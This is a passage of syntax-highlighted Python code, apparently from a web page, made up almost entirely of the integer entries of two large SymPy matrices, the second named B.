class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">18</span>], [<span class="number">12</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">12</span>], [<span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">19</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">15</span>], [<span class="number">11</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>], [<span class="number">10</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>], [<span class="number">7</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>], [<span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>], [<span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>], [<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>]])</span><br><span class="line"></span><br><span class="line">B=Matrix([[<span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">18</span>], [<span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">18</span>], [<span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">18</span>], [<span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">18</span>], [<span class="number">16</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>], [<span class="number">16</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>], [<span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>], [<span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>], [<span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">6</span>, <span 